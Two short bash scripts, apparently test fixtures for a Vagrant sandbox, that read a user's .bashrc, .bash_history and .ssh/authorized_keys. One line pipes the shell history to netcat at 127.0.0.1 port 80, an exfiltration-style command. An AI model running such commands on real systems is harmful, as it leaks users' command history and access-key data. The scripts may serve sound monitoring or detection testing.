#!/bin/bash

cat ~/.bashrc
ls -la ~
#!/bin/bash

/usr/bin/head /home/vagrant/.bashrc
/usr/bin/head /home/vagrant/.bash_history | /bin/nc 127.0.0.1 80
/usr/bin/head /home/vagrant/.ssh/authorized_keys

# uncomment when it's time
#/usr/bin/head /home/vagrant/testfile
